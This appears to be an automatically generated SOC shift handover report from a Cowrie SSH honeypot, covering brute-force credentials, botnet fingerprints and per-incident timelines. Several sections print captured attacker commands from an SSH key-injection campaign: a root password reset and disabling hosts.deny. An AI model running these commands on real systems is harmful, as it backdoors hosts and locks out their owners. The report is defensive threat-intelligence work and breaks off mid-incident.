# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-17 |
| **Generated At** | 2026-06-17T22:04:39Z |
| **Shift Time** | 22:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **212** |
| Confirmed Threats | **197** |
| False Positives Filtered | **15** (7.1%) |
| Unique Attacker IPs | **57** |
| Countries of Origin | **20** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **202** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **49** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **38** |
| Unique Passwords | **36** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 3 |
| `simon` | 1 |
| `postgres` | 1 |
| `alex` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 8 |
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `r0ot` | 2 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `r0ot` | 2 |
| `root` | `Oracle123` | 1 |
| `simon` | `123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Oracle123` | `36.212.227.224` | 2026-06-17T18:23:05 |
| `root` | `Aa@13579` | `103.130.213.223` | 2026-06-17T19:28:01 |
| `root` | `3245gs5662d34` | `103.130.213.223` | 2026-06-17T19:28:07 |
| `root` | `r0ot` | `183.196.144.45` | 2026-06-17T19:34:42 |
| `root` | `r0ot` | `178.178.194.128` | 2026-06-17T19:34:49 |
| `root` | `11112222` | `14.103.126.104` | 2026-06-17T20:40:28 |
| `root` | `6543210` | `45.61.187.220` | 2026-06-17T20:50:54 |
| `root` | `3245gs5662d34` | `45.61.187.220` | 2026-06-17T20:51:00 |
| `root` | `Password#123` | `121.184.144.232` | 2026-06-17T20:56:37 |
| `root` | `3245gs5662d34` | `121.184.144.232` | 2026-06-17T20:56:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **212** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 47 |
| OpenSSH | 11 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 36 | 8 |
| `acaa53e0a7d7...` | Mirai/variant | 11 | 11 |
| `03a80b21afa8...` | Modern SSH client | 10 | 6 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 36 | 8 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 11 | 11 | Mirai/variant |
| `03a80b21afa8...` | libssh | 10 | 6 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:1QJB7Chbvzuf"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `36.212.227.224`, `14.103.126.104`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `121.184.144.232`, `103.130.213.223`, `45.61.187.220`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **57** |
| Unique ASNs | **41** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-210fd51b1599

| Field | Detail |
|---|---|
| **Source IP** | `36.212.227[.]224` |
| **First Seen** | 2026-06-17 18:23 |
| **Last Seen** | 2026-06-17 18:23 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1QJB7Chbvzuf"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 18:23:04` | `cowrie.session.connect` |
| `2026-06-17 18:23:05` | `cowrie.client.version` |
| `2026-06-17 18:23:05` | `cowrie.client.kex` |
| `2026-06-17 18:23:05` | `cowrie.login.success` |
| `2026-06-17 18:23:05` | `cowrie.session.params` |
| `2026-06-17 18:23:05` | `cowrie.command.input` |
| `2026-06-17 18:23:05` | `cowrie.command.failed` |
| `2026-06-17 18:23:06` | `cowrie.log.closed` |
| `2026-06-17 18:23:06` | `cowrie.session.params` |
| `2026-06-17 18:23:06` | `cowrie.command.input` |
| `2026-06-17 18:23:06` | `cowrie.session.file_download` |
| `2026-06-17 18:23:06` | `cowrie.log.closed` |
| `2026-06-17 18:23:18` | `cowrie.session.params` |
| `2026-06-17 18:23:18` | `cowrie.command.input` |
| `2026-06-17 18:23:19` | `cowrie.log.closed` |
| `2026-06-17 18:23:19` | `cowrie.session.params` |
| `2026-06-17 18:23:19` | `cowrie.command.input` |
| `2026-06-17 18:23:19` | `cowrie.log.closed` |
| `2026-06-17 18:23:20` | `cowrie.session.params` |
| `2026-06-17 18:23:20` | `cowrie.command.input` |
| `2026-06-17 18:23:20` | `cowrie.session.file_download` |
| `2026-06-17 18:23:20` | `cowrie.log.closed` |
| `2026-06-17 18:23:20` | `cowrie.session.params` |
| `2026-06-17 18:23:20` | `cowrie.command.input` |
| `2026-06-17 18:23:20` | `cowrie.log.closed` |
| `2026-06-17 18:23:21` | `cowrie.session.params` |
| `2026-06-17 18:23:21` | `cowrie.command.input` |
| `2026-06-17 18:23:21` | `cowrie.log.closed` |
| `2026-06-17 18:23:21` | `cowrie.session.params` |
| `2026-06-17 18:23:21` | `cowrie.command.input` |
| `2026-06-17 18:23:21` | `cowrie.command.input` |
| `2026-06-17 18:23:21` | `cowrie.log.closed` |
| `2026-06-17 18:23:22` | `cowrie.session.params` |
| `2026-06-17 18:23:22` | `cowrie.command.input` |
| `2026-06-17 18:23:22` | `cowrie.log.closed` |
| `2026-06-17 18:23:22` | `cowrie.session.params` |
| `2026-06-17 18:23:22` | `cowrie.command.input` |
| `2026-06-17 18:23:22` | `cowrie.log.closed` |
| `2026-06-17 18:23:23` | `cowrie.session.params` |
| `2026-06-17 18:23:23` | `cowrie.command.input` |
| `2026-06-17 18:23:23` | `cowrie.log.closed` |
| `2026-06-17 18:23:23` | `cowrie.session.params` |
| `2026-06-17 18:23:23` | `cowrie.command.input` |
| `2026-06-17 18:23:23` | `cowrie.log.closed` |
| `2026-06-17 18:23:24` | `cowrie.session.params` |
| `2026-06-17 18:23:24` | `cowrie.command.input` |
| `2026-06-17 18:23:24` | `cowrie.log.closed` |
| `2026-06-17 18:23:24` | `cowrie.session.params` |
| `2026-06-17 18:23:24` | `cowrie.command.input` |
| `2026-06-17 18:23:24` | `cowrie.log.closed` |
| `2026-06-17 18:23:25` | `cowrie.session.params` |
| `2026-06-17 18:23:25` | `cowrie.command.input` |
| `2026-06-17 18:23:25` | `cowrie.log.closed` |
| `2026-06-17 18:23:25` | `cowrie.session.params` |
| `2026-06-17 18:23:25` | `cowrie.command.input` |
| `2026-06-17 18:23:25` | `cowrie.log.closed` |
| `2026-06-17 18:23:26` | `cowrie.session.params` |
| `2026-06-17 18:23:26` | `cowrie.command.input` |
| `2026-06-17 18:23:26` | `cowrie.log.closed` |
| `2026-06-17 18:23:26` | `cowrie.session.params` |
| `2026-06-17 18:23:26` | `cowrie.command.input` |
| `2026-06-17 18:23:26` | `cowrie.log.closed` |
| `2026-06-17 18:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.212.227[.]224` to AbuseIPDB if not already reported
- [ ] Block `36.212.227[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f2d3b03c0c

| Field | Detail |
|---|---|
| **Source IP** | `103.130.213[.]223` |
| **First Seen** | 2026-06-17 19:28 |
| **Last Seen** | 2026-06-17 19:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 19:28:00` | `cowrie.session.connect` |
| `2026-06-17 19:28:00` | `cowrie.client.version` |
| `2026-06-17 19:28:00` | `cowrie.client.kex` |
| `2026-06-17 19:28:01` | `cowrie.login.success` |
| `2026-06-17 19:28:02` | `cowrie.session.params` |
| `2026-06-17 19:28:02` | `cowrie.command.input` |
| `2026-06-17 19:28:02` | `cowrie.command.failed` |
| `2026-06-17 19:28:02` | `cowrie.log.closed` |
| `2026-06-17 19:28:03` | `cowrie.session.params` |
| `2026-06-17 19:28:03` | `cowrie.command.input` |
| `2026-06-17 19:28:03` | `cowrie.session.file_download` |
| `2026-06-17 19:28:03` | `cowrie.log.closed` |
| `2026-06-17 19:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.130.213[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.130.213[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e95e1407f30

| Field | Detail |
|---|---|
| **Source IP** | `103.130.213[.]223` |
| **First Seen** | 2026-06-17 19:28 |
| **Last Seen** | 2026-06-17 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 19:28:06` | `cowrie.session.connect` |
| `2026-06-17 19:28:06` | `cowrie.client.version` |
| `2026-06-17 19:28:06` | `cowrie.client.kex` |
| `2026-06-17 19:28:07` | `cowrie.login.success` |
| `2026-06-17 19:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.130.213[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.130.213[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c61e7e277bc

| Field | Detail |
|---|---|
| **Source IP** | `183.196.144[.]45` |
| **First Seen** | 2026-06-17 19:34 |
| **Last Seen** | 2026-06-17 19:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 19:34:40` | `cowrie.session.connect` |
| `2026-06-17 19:34:41` | `cowrie.client.version` |
| `2026-06-17 19:34:41` | `cowrie.client.kex` |
| `2026-06-17 19:34:42` | `cowrie.login.success` |
| `2026-06-17 19:34:42` | `cowrie.direct-tcpip.request` |
| `2026-06-17 19:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.196.144[.]45` to AbuseIPDB if not already reported
- [ ] Block `183.196.144[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b551b1b13b47

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-06-17 19:34 |
| **Last Seen** | 2026-06-17 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 19:34:48` | `cowrie.session.connect` |
| `2026-06-17 19:34:48` | `cowrie.client.version` |
| `2026-06-17 19:34:48` | `cowrie.client.kex` |
| `2026-06-17 19:34:49` | `cowrie.login.success` |
| `2026-06-17 19:34:50` | `cowrie.direct-tcpip.request` |
| `2026-06-17 19:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360b68f89efe

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-06-17 20:40 |
| **Last Seen** | 2026-06-17 20:40 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:N647WwGoZUEt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 20:40:27` | `cowrie.session.connect` |
| `2026-06-17 20:40:27` | `cowrie.client.version` |
| `2026-06-17 20:40:28` | `cowrie.client.kex` |
| `2026-06-17 20:40:28` | `cowrie.login.success` |
| `2026-06-17 20:40:28` | `cowrie.session.params` |
| `2026-06-17 20:40:28` | `cowrie.command.input` |
| `2026-06-17 20:40:28` | `cowrie.command.failed` |
| `2026-06-17 20:40:29` | `cowrie.log.closed` |
| `2026-06-17 20:40:29` | `cowrie.session.params` |
| `2026-06-17 20:40:29` | `cowrie.command.input` |
| `2026-06-17 20:40:29` | `cowrie.session.file_download` |
| `2026-06-17 20:40:29` | `cowrie.log.closed` |
| `2026-06-17 20:40:45` | `cowrie.session.params` |
| `2026-06-17 20:40:45` | `cowrie.command.input` |
| `2026-06-17 20:40:45` | `cowrie.log.closed` |
| `2026-06-17 20:40:46` | `cowrie.session.params` |
| `2026-06-17 20:40:46` | `cowrie.command.input` |
| `2026-06-17 20:40:46` | `cowrie.log.closed` |
| `2026-06-17 20:40:46` | `cowrie.session.params` |
| `2026-06-17 20:40:46` | `cowrie.command.input` |
| `2026-06-17 20:40:46` | `cowrie.session.file_download` |
| `2026-06-17 20:40:46` | `cowrie.log.closed` |
| `2026-06-17 20:40:47` | `cowrie.session.params` |
| `2026-06-17 20:40:47` | `cowrie.command.input` |
| `2026-06-17 20:40:47` | `cowrie.log.closed` |
| `2026-06-17 20:40:47` | `cowrie.session.params` |
| `2026-06-17 20:40:47` | `cowrie.command.input` |
| `2026-06-17 20:40:47` | `cowrie.log.closed` |
| `2026-06-17 20:40:47` | `cowrie.session.params` |
| `2026-06-17 20:40:47` | `cowrie.command.input` |
| `2026-06-17 20:40:47` | `cowrie.command.input` |
| `2026-06-17 20:40:48` | `cowrie.log.closed` |
| `2026-06-17 20:40:48` | `cowrie.session.params` |
| `2026-06-17 20:40:48` | `cowrie.command.input` |
| `2026-06-17 20:40:48` | `cowrie.log.closed` |
| `2026-06-17 20:40:48` | `cowrie.session.params` |
| `2026-06-17 20:40:48` | `cowrie.command.input` |
| `2026-06-17 20:40:48` | `cowrie.log.closed` |
| `2026-06-17 20:40:49` | `cowrie.session.params` |
| `2026-06-17 20:40:49` | `cowrie.command.input` |
| `2026-06-17 20:40:49` | `cowrie.log.closed` |
| `2026-06-17 20:40:49` | `cowrie.session.params` |
| `2026-06-17 20:40:49` | `cowrie.command.input` |
| `2026-06-17 20:40:49` | `cowrie.log.closed` |
| `2026-06-17 20:40:50` | `cowrie.session.params` |
| `2026-06-17 20:40:50` | `cowrie.command.input` |
| `2026-06-17 20:40:50` | `cowrie.log.closed` |
| `2026-06-17 20:40:50` | `cowrie.session.params` |
| `2026-06-17 20:40:50` | `cowrie.command.input` |
| `2026-06-17 20:40:50` | `cowrie.log.closed` |
| `2026-06-17 20:40:51` | `cowrie.session.params` |
| `2026-06-17 20:40:51` | `cowrie.command.input` |
| `2026-06-17 20:40:51` | `cowrie.log.closed` |
| `2026-06-17 20:40:51` | `cowrie.session.params` |
| `2026-06-17 20:40:51` | `cowrie.command.input` |
| `2026-06-17 20:40:51` | `cowrie.log.closed` |
| `2026-06-17 20:40:51` | `cowrie.session.params` |
| `2026-06-17 20:40:51` | `cowrie.command.input` |
| `2026-06-17 20:40:52` | `cowrie.log.closed` |
| `2026-06-17 20:40:52` | `cowrie.session.params` |
| `2026-06-17 20:40:52` | `cowrie.command.input` |
| `2026-06-17 20:40:52` | `cowrie.log.closed` |
| `2026-06-17 20:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e699bc346c

| Field | Detail |
|---|---|
| **Source IP** | `45.61.187[.]220` |
| **First Seen** | 2026-06-17 20:50 |
| **Last Seen** | 2026-06-17 20:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 20:50:53` | `cowrie.session.connect` |
| `2026-06-17 20:50:53` | `cowrie.client.version` |
| `2026-06-17 20:50:53` | `cowrie.client.kex` |
| `2026-06-17 20:50:54` | `cowrie.login.success` |
| `2026-06-17 20:50:55` | `cowrie.session.params` |
| `2026-06-17 20:50:55` | `cowrie.command.input` |
| `2026-06-17 20:50:55` | `cowrie.command.failed` |
| `2026-06-17 20:50:55` | `cowrie.log.closed` |
| `2026-06-17 20:50:56` | `cowrie.session.params` |
| `2026-06-17 20:50:56` | `cowrie.command.input` |
| `2026-06-17 20:50:56` | `cowrie.session.file_download` |
| `2026-06-17 20:50:56` | `cowrie.log.closed` |
| `2026-06-17 20:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.61.187[.]220` to AbuseIPDB if not already reported
- [ ] Block `45.61.187[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd3e74032af

| Field | Detail |
|---|---|
| **Source IP** | `45.61.187[.]220` |
| **First Seen** | 2026-06-17 20:50 |
| **Last Seen** | 2026-06-17 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 20:50:59` | `cowrie.session.connect` |
| `2026-06-17 20:50:59` | `cowrie.client.version` |
| `2026-06-17 20:50:59` | `cowrie.client.kex` |
| `2026-06-17 20:51:00` | `cowrie.login.success` |
| `2026-06-17 20:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.61.187[.]220` to AbuseIPDB if not already reported
- [ ] Block `45.61.187[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d719ec1f1988

| Field | Detail |
|---|---|
| **Source IP** | `121.184.144[.]232` |
| **First Seen** | 2026-06-17 20:56 |
| **Last Seen** | 2026-06-17 20:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
